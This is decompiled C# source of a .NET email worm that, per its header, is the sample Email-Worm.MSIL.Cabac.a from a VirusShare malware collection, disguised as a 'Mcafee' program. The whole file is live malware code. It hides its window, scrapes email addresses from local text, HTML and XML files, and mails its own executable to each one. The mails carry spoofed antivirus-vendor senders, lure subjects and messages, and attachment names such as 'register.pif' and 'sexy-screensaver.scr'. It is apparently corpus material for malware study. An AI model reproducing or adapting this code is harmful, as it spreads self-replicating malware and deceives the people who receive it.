﻿// Decompiled with JetBrains decompiler
// Type: Mcafee.Form2
// Assembly: Mcafee, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E8ABDF02-8A4A-421D-8941-056F8CA96A8B
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Email-Worm.MSIL.Cabac.a-6a616d6396ea98af23899d1ef241f1987c0c048c5ff5c3600a97133b5e844b01.exe

using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Web.Mail;
using System.Windows.Forms;

namespace Mcafee
{
  public class Form2 : Form
  {
    private IContainer components;

    public Form2() => this.InitializeComponent();

    private void Form2_Load(object sender, EventArgs e)
    {
    }

    private void amir(object sender, EventArgs e)
    {
      this.Hide();
      try
      {
        for (int index = 0; index < 6; ++index)
        {
          string str1 = new string[20]
          {
            "mcafee",
            "symantec",
            "Yahoo!",
            "Norton! ",
            "Text message",
            "NOD32",
            "Important bill!  ",
            "Message Notify ",
            "Fax Message",
            "Protected message",
            "Cum a murit Papa?",
            "Encrypted document",
            "Account notify",
            "E-mail account disabling warning",
            "E-mail technical support message.",
            "E-mail warning",
            "Email account utilization warning.",
            "Fax Message Received ",
            "Pentru Ionel",
            "IranSare2008"
          }[new Random().Next(0, 20)];
          string str2 = new string[5]
          {
            "AmirCivil.pic.cmd",
            "register.pif ",
            "sexy-screensaver.scr ",
            "fullmessenger.exe",
            "readme.html.cmd"
          }[new Random().Next(0, 5)];
          string str3 = new string[20]
          {
            "nice stuffs i got here... ",
            "Message Error",
            "i've got cool stuffs here...  ",
            "i want you to know how much i care for you... ",
            "hello! i'm your long, lost friend... ",
            "kindness is a virtue... ",
            "sharing files is the essence of living... check this out... ",
            "hi, friend... here are some nice stuffs that i got from the internet... check it out...  ",
            "hmmmn... i guess you've forgotten me... but anyways, i wanna make up... here are the files that made me like the internet more... see for yourself...",
            "one of the files is a virus... can you tell me which one is it? hehehe, i'm only joking... your friend, paul.. ",
            "classroom test of you? ",
            "old photos about you? ",
            "i hope thats not true! ",
            "three files for you to keep... always remember that i'm into deep... i don't know you but i think i'm in love... ",
            " you know amir_civil?!",
            "Ioana, sex in grup in camin. Cred ca o stii si ",
            "another pic, have fun! ... :->",
            "Credeti ca ar fi mai bine ca Romania sa-si retraga trupele din Irak anul acesta?Deschideti programul Vot, alegeti votul dvs. si vedeti rezultatele.Parerea dvs. conteaza!",
            "the information is wrong! ",
            "Credeti ca ar fi mai bine ca Romania sa-si retraga trupele din Irak anul acesta?Deschideti programul Vot, alegeti votul dvs. si vedeti rezultatele.Parerea dvs. conteaza! "
          }[new Random().Next(0, 20)];
          string searchPattern = new string[3]
          {
            "*txt",
            "*html",
            "*xml"
          }[new Random().Next(0, 3)];
          string str4 = new string[20]
          {
            "mcafee@yahoo.com",
            "symantec@yahoo.com",
            "nod32@yahoo.com",
            "panda@yahoo.com",
            "avg@yahoo.com",
            "password@yahoo.com",
            "info@yahoo.com",
            "ebook@yahoo.com",
            "LongShot@yahoo.com",
            "pic@yahoo.com",
            "update@yahoo.com",
            "matt@yahoo.com",
            "steve@yahoo.com",
            "smith@yahoo.com",
            "stan@yahoo.com",
            "bill@yahoo.com",
            "bob@yahoo.com",
            "YourFriend@yahoo.com",
            " mail@yahoo.com",
            "ted@yahoo.com"
          }[new Random().Next(0, 20)];
          string path = new string[5]
          {
            "C:\\",
            "D:\\",
            "E:\\",
            "G:\\",
            "F:\\"
          }[new Random().Next(0, 5)];
          try
          {
            string[] strArray = new string[1]
            {
              "C:\\windows"
            };
            foreach (string str5 in strArray)
            {
              foreach (string file in Directory.GetFiles(path, searchPattern))
              {
                Regex regex = new Regex("[a-zA-Z0-9-_.-]+@[a-zA-Z0-9-_.-]+\\.[a-zA-Z0-9]+");
                FileStream fileStream = new FileStream(file, FileMode.Open, FileAccess.Read);
                byte[] numArray = new byte[fileStream.Length];
                fileStream.Read(numArray, 0, (int) fileStream.Length);
                fileStream.Close();
                foreach (Match match in regex.Matches(Encoding.ASCII.GetString(numArray)))
                {
                  string str6 = match.ToString();
                  try
                  {
                    MailMessage message = new MailMessage();
                    message.From = str4;
                    message.To = str6;
                    message.Cc = "info@yahoo.com";
                    message.Bcc = "password@yahoo.com";
                    message.Subject = str1;
                    message.Body = str3;
                    SmtpMail.SmtpServer = "mx4.mail.yahoo.com";
                    message.Attachments.Add((object) new MailAttachment(Application.ExecutablePath, MailEncoding.Base64));
                    SmtpMail.Send(message);
                  }
                  catch (Exception ex)
                  {
                  }
                }
              }
            }
          }
          catch (Exception ex)
          {
          }
        }
      }
      catch (Exception ex)
      {
      }
    }

    private void timer1_Tick(object sender, EventArgs e)
    {
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(292, 266);
      this.Name = nameof (Form2);
      this.Text = nameof (Form2);
      this.Activated += new EventHandler(this.amir);
      this.Load += new EventHandler(this.Form2_Load);
      this.ResumeLayout(false);
    }
  }
}
